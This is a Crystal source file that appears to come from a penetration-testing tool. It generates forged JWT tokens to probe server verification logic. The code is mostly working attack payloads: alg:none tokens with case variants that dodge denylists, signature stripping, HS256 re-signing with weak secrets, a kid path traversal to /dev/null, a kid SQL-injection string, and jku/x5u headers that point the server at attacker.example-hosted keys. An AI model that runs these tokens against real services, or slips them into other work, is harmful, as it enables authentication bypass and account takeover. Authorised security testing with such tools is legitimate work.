require "base64"
require "json"

module Gori
  # Testing-payload generator: given a JWT, produce the family of tampered tokens a tester
  # would hand-craft to probe a server's verification logic. Deterministic (no wall clock)
  # and never raises — an undecodable token just yields an empty list. Three families:
  # alg:none / signature-strip, weak-secret HS re-sign, and header-parameter injection.
  # Signing reuses `Jwt.sign` (see forge.cr).
  module Jwt
    extend self

    # One generated payload: a short `name`, its `category` (for grouping/colour), the
    # tampered `token`, and a `note` explaining what server behaviour it probes.
    record Attack,
      name : String,
      category : String,
      token : String,
      note : String

    # The dictionary the weak-secret family re-signs with (HS256). Small on purpose — the
    # point is "is the key one of these obvious values", not a brute-force. "" first: an
    # empty HMAC key is a real misconfiguration and the /dev/null kid trick relies on it.
    WEAK_SECRETS = ["", "secret", "password", "changeme", "admin", "key", "jwt", "123456",
                    "secretkey", "test", "root", "your-256-bit-secret"]

    # Every attack token for `token`, grouped by family in a stable order. Empty when the
    # input isn't a structurally-decodable JWT (need ≥2 segments and a JSON-object header).
    def attacks(token : String) : Array(Attack)
      list = [] of Attack
      parts = token.strip.split('.')
      return list unless parts.size >= 2
      header_seg, payload_seg = parts[0], parts[1]
      header = decode_header(header_seg)
      return list unless header

      none_family(list, header, header_seg, payload_seg)
      weak_secret_family(list, header, payload_seg)
      header_injection_family(list, header, payload_seg)
      list
    end

    # --- family 1: alg:none + signature strip ------------------------------------
    # Servers that honour `alg` from the token itself accept an unsigned token; the case
    # variants dodge naive `alg == "none"` denylists. Also the two signature-removal shapes.
    private def none_family(list, header, header_seg : String, payload_seg : String) : Nil
      %w(none None NONE nOnE).each do |a|
        h = header.dup
        h["alg"] = JSON::Any.new(a)
        list << Attack.new("alg=#{a}", "none",
          "#{b64url(h.to_json)}.#{payload_seg}.",
          "unsigned; accepted if the server trusts alg=#{a} from the token")
      end
      list << Attack.new("signature stripped", "none",
        "#{header_seg}.#{payload_seg}.",
        "original header, empty signature segment (3-part)")
      list << Attack.new("no signature segment", "none",
        "#{header_seg}.#{payload_seg}",
        "2-part token — signature segment removed entirely")
    end

    # --- family 2: weak-secret HS256 re-sign -------------------------------------
    # Re-sign under each dictionary key; whichever the server accepts reveals its secret.
    private def weak_secret_family(list, header, payload_seg : String) : Nil
      WEAK_SECRETS.each do |secret|
        h = header.dup
        h["alg"] = JSON::Any.new("HS256")
        signing_input = "#{b64url(h.to_json)}.#{payload_seg}"
        shown = secret.empty? ? "(empty)" : secret
        list << Attack.new("HS256 secret=#{shown}", "weak-secret",
          "#{signing_input}.#{sign(signing_input, "HS256", secret)}",
          "verifies if the server's HMAC key is #{secret.empty? ? "empty" : secret.inspect}")
      end
    end

    # --- family 3: header-parameter injection ------------------------------------
    # kid/jku/x5u/jwk drive the server's KEY RESOLUTION. Most can't be locally signed
    # (the resolved key is attacker-hosted), so they carry an unsigned/none signature plus
    # a note on how to complete the attack. The /dev/null kid is the exception: it points
    # the server at an empty file, so an HS256 sign with an EMPTY key actually verifies.
    private def header_injection_family(list, header, payload_seg : String) : Nil
      # kid → /dev/null: empty key file → HMAC("") verifies.
      dn = header.dup
      dn["alg"] = JSON::Any.new("HS256")
      dn["kid"] = JSON::Any.new("../../../../../../../../dev/null")
      dn_input = "#{b64url(dn.to_json)}.#{payload_seg}"
      list << Attack.new("kid=/dev/null", "header-inject",
        "#{dn_input}.#{sign(dn_input, "HS256", "")}",
        "kid path-traversal to an empty file → HMAC with an empty key verifies")

      # kid SQL injection — probes a DB-backed key lookup.
      list << injected(header, payload_seg, "kid SQLi", "kid",
        "x' UNION SELECT 'attacker",
        "kid used in a SQL key lookup; craft the UNION to return a known key")

      # jku / x5u — the server fetches a JWKS / cert chain from an attacker URL.
      list << injected(header, payload_seg, "jku (attacker JWKS)", "jku",
        "https://attacker.example/.well-known/jwks.json",
        "host a JWKS with your public key at the jku URL, sign with its private key")
      list << injected(header, payload_seg, "x5u (attacker cert)", "x5u",
        "https://attacker.example/x5u.pem",
        "host a cert chain at the x5u URL, sign with its private key")

      # jwk — an embedded public key the server may trust blindly.
      jwk = JSON::Any.new({
        "kty" => JSON::Any.new("RSA"),
        "kid" => JSON::Any.new("attacker"),
        "use" => JSON::Any.new("sig"),
        "n"   => JSON::Any.new("<your-modulus-base64url>"),
        "e"   => JSON::Any.new("AQAB"),
      })
      j = header.dup
      j["jwk"] = jwk
      list << Attack.new("jwk (embedded key)", "header-inject",
        "#{b64url(j.to_json)}.#{payload_seg}.",
        "server may trust the embedded jwk; sign with the matching private key")
    end

    # A header-injection token that keeps the original alg/signature-empty and just splices
    # in one header parameter — the signature is left empty because completing it needs the
    # attacker-resolved key (see the note).
    private def injected(header, payload_seg : String, name : String, key : String,
                         value : String, note : String) : Attack
      h = header.dup
      h[key] = JSON::Any.new(value)
      Attack.new(name, "header-inject", "#{b64url(h.to_json)}.#{payload_seg}.", note)
    end

    private def decode_header(seg : String) : Hash(String, JSON::Any)?
      JSON.parse(String.new(Base64.decode(seg))).as_h
    rescue
      nil
    end
  end
end
